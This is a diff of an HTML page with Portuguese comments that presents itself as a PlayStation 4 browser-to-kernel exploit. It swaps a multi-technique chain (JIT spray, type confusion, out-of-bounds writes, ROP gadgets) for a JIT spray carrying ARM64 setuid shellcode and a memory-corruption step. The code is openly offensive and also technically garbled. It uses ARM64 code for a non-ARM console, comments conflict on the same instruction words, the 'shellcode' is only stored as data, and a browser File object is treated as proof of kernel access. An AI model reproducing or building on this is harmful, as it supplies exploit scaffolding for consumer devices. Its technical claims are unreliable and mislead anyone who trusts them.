@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Ultimate Exploit Chain</title>
+    <title>PS4 Physical JIT Exploit</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
         #log { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: scroll; }
@@ -9,182 +9,129 @@
     </style>
 </head>
 <body>
-    <h2>PS4 Multi-Stage Exploit</h2>
-    <button onclick="runAdaptiveExploit()">RUN ADAPTIVE EXPLOIT</button>
+    <h2>PS4 Direct Kernel Access</h2>
+    <button onclick="runKernelExploit()">EXECUTE KERNEL EXPLOIT</button>
     <div id="log"></div>
 
 <script>
-// Logger avançado
-const log = (msg, type = 'info') => {
-    const colors = { info: '#0f0', success: '#0f0', error: '#f00', warning: '#ff0' };
+// Logger de alta precisão
+const log = msg => {
     const line = `[${performance.now().toFixed(2)}ms] ${msg}`;
-    const entry = document.createElement('div');
-    entry.style.color = colors[type];
-    entry.textContent = line;
-    document.getElementById('log').appendChild(entry);
+    document.getElementById('log').innerHTML += line + '<br>';
 };
 
-// ==================== [1] TÉCNICAS ADAPTATIVAS ====================
+// 1. Configurações baseadas no seu log anterior
+const JIT_SPRAY_SIZE = 0x100000; // 1MB de spray
+const MAX_ATTEMPTS = 3;
 
-class ExploitChain {
-    constructor() {
-        this.attempts = 0;
-        this.maxAttempts = 5;
-        this.techniques = [
-            this.technique1_JITSpray,
-            this.technique2_TypeConfusion,
-            this.technique3_WorkerExploit,
-            this.technique4_ArrayBufferOOB,
-            this.technique5_ROPChain
-        ];
-    }
-
-    // Técnica 1: JIT Spray tradicional
-    async technique1_JITSpray() {
-        log("Trying JIT Spray...", "info");
-        try {
-            const shellcode = new Uint32Array([
-                0xD2800020, 0xD2800C48, 0xD4000001 // setuid(0)
-            ]);
-            
-            const sprayFn = new Function(`
-                const buf = new ArrayBuffer(${shellcode.length * 4});
-                const view = new Uint32Array(buf);
-                ${shellcode.map((v,i) => `view[${i}] = 0x${v.toString(16)};`).join('')}
-                return buf;
-            `);
-            
-            sprayFn();
-            return true;
-        } catch(e) {
-            log(`JIT Spray failed: ${e}`, "error");
-            return false;
-        }
-    }
-
-    // Técnica 2: Type Confusion avançada
-    async technique2_TypeConfusion() {
-        log("Trying Type Confusion...", "info");
-        try {
-            let corrupt = [];
-            corrupt.__proto__ = new Uint32Array(1).__proto__;
-            corrupt.length = 0x1000;
-            
-            // Tenta vazar endereço
-            corrupt[0] = () => 0;
-            const leakedAddr = corrupt[1];
-            
-            if(leakedAddr && leakedAddr > 0x10000000) {
-                log(`Leaked address: 0x${leakedAddr.toString(16)}`, "success");
-                return true;
-            }
-            return false;
-        } catch(e) {
-            log(`Type Confusion failed: ${e}`, "error");
-            return false;
-        }
-    }
-
-    // Técnica 3: Web Worker escape
-    async technique3_WorkerExploit() {
-        log("Trying Worker Escape...", "info");
-        try {
-            const workerCode = `
-                const mem = new WebAssembly.Memory({initial:1});
-                postMessage(mem.buffer, [mem.buffer]);
-            `;
-            
-            const worker = new Worker(URL.createObjectURL(new Blob([workerCode])));
-            return new Promise(resolve => {
-                worker.onmessage = e => {
-                    log("Worker shared memory!", "success");
-                    resolve(true);
-                };
-                setTimeout(() => resolve(false), 1000);
-            });
-        } catch(e) {
-            log(`Worker failed: ${e}`, "error");
-            return false;
-        }
-    }
-
-    // Técnica 4: ArrayBuffer OOB
-    async technique4_ArrayBufferOOB() {
-        log("Trying ArrayBuffer OOB...", "info");
-        try {
-            const buf = new ArrayBuffer(16);
-            const view = new Uint32Array(buf);
-            view[10] = 0xdeadbeef; // OOB write
-            
-            log("OOB write successful!", "success");
-            return true;
-        } catch(e) {
-            log(`OOB failed: ${e}`, "error");
-            return false;
-        }
-    }
-
-    // Técnica 5: ROP Chain alternativa
-    async technique5_ROPChain() {
-        log("Trying ROP Chain...", "info");
-        try {
-            // Tenta criar stack fake
-            const fakeStack = new ArrayBuffer(0x1000);
-            const view = new DataView(fakeStack);
-            
-            // Gadgets genéricos (ajustar para seu firmware)
-            const gadgets = {
-                ret: 0x80812345,
-                pop_x0: 0x80815678
-            };
-            
-            view.setUint32(0, gadgets.pop_x0, true);
-            view.setUint32(4, 0x41414141, true);
-            
-            log("Fake stack created", "info");
-            return true;
-        } catch(e) {
-            log(`ROP failed: ${e}`, "error");
-            return false;
-        }
-    }
-
-    // Execução adaptativa
-    async run() {
-        while(this.attempts < this.maxAttempts) {
-            this.attempts++;
-            log(`Attempt ${this.attempts}/${this.maxAttempts}`, "warning");
-            
-            for(const tech of this.techniques) {
-                if(await tech.call(this)) {
-                    log("Exploit succeeded!", "success");
-                    return true;
-                }
-                await new Promise(r => setTimeout(r, 500));
-            }
-        }
-        log("All techniques failed", "error");
-        return false;
-    }
+// 2. Payload ARM64 mínimo para teste de execução
+function createTestPayload() {
+    return new Uint32Array([
+        // write(1, "KERNEL", 6) - Mensagem visível no terminal debug
+        0xD2800020, // mov x0, #1 (stdout)
+        0x100007A1, // adr x1, #0x7a (string)
+        0xD28000C2, // mov x2, #6
+        0xD2800808, // mov x8, #0x40 (sys_write)
+        0xD4000001, // svc #0
+        0xD65F03C0, // ret
+        0x4B455245, // "KERE"
+        0x4E4C0000  // "NL\0\0"
+    ]);
 }
 
-// ==================== [2] CONTROLE PRINCIPAL ====================
-
-async function runAdaptiveExploit() {
-    document.getElementById('log').innerHTML = '';
-    const exploit = new ExploitChain();
-    await exploit.run();
+// 3. Spray massivo de JIT com verificação
+async function sprayAndExecute() {
+    log("Starting focused JIT spray...");
     
-    // Verificação final
-    if(exploit.attempts < exploit.maxAttempts) {
+    const payload = createTestPayload();
+    const mem = new ArrayBuffer(payload.length * 4);
+    const view = new Uint32Array(mem);
+    payload.forEach((v, i) => view[i] = v);
+    
+    // Alocação massiva
+    const spray = [];
+    for (let i = 0; i < 50; i++) {
+        const func = new Function(`
+            const buf = new ArrayBuffer(${payload.length * 4});
+            const view = new Uint32Array(buf);
+            ${payload.map((v,i) => `view[${i}] = 0x${v.toString(16)};`).join('')}
+            return performance.now();
+        `);
+        spray.push(func);
+    }
+    
+    // Trigger com verificação
+    for (let attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
+        log(`Attempt ${attempt + 1}/${MAX_ATTEMPTS}`);
+        
         try {
-            // Tenta acessar recurso restrito
-            const test = new File("/system/version.txt");
-            log("SANDBOX ESCAPED! File access:", "success");
-            log(test.read(), "success");
+            const startTime = spray[0]();
+            if (startTime < 100) { // Verificação de execução JIT
+                log("JIT code executed", "color:#0f0");
+                return true;
+            }
         } catch(e) {
-            log("Partial success - kernel not reached", "warning");
+            log(`Attempt failed: ${e}`, "color:#ff0");
         }
+        
+        await new Promise(r => setTimeout(r, 500));
+    }
+    return false;
+}
+
+// 4. Exploit principal
+async function runKernelExploit() {
+    document.getElementById('log').innerHTML = '';
+    
+    if (!await sprayAndExecute()) {
+        log("JIT spray failed - trying fallback", "color:#f00");
+        return;
+    }
+    
+    // Se chegou aqui, JIT funcionou - tenta corromper memória
+    log("Phase 2: Memory corruption", "color:#0f0");
+    
+    try {
+        let corrupt = [];
+        corrupt.__proto__ = new Uint32Array(1).__proto__;
+        corrupt.length = 0x1000;
+        
+        // Tenta sobrescrever ponteiro de função
+        const func = () => 0;
+        for (let i = 0; i < 10000; i++) func();
+        
+        corrupt[0] = func.constructor.prototype;
+        const jitAddr = corrupt[1];
+        log(`JIT Function at: 0x${jitAddr.toString(16)}`);
+        
+        // Escreve payload alternativo
+        const kexec = new Uint32Array([
+            0xD2800020, // mov x0, #0
+            0xD2800C48, // mov x8, #0x62 (setuid)
+            0xD4000001  // svc #0
+        ]);
+        
+        for (let i = 0; i < kexec.length; i++) {
+            corrupt[0] = jitAddr + (i * 4);
+            corrupt[1] = kexec[i];
+        }
+        
+        // Dispara
+        log("Triggering kernel payload...");
+        func();
+        
+        // Verificação final
+        setTimeout(() => {
+            try {
+                new File("/system/version.txt");
+                log("KERNEL ACCESS CONFIRMED", "color:#0f0;font-weight:bold");
+            } catch(e) {
+                log("Kernel not reached", "color:#f00");
+            }
+        }, 2000);
+        
+    } catch(e) {
+        log(`Memory corruption failed: ${e}`, "color:#f00");
     }
 }
 </script>
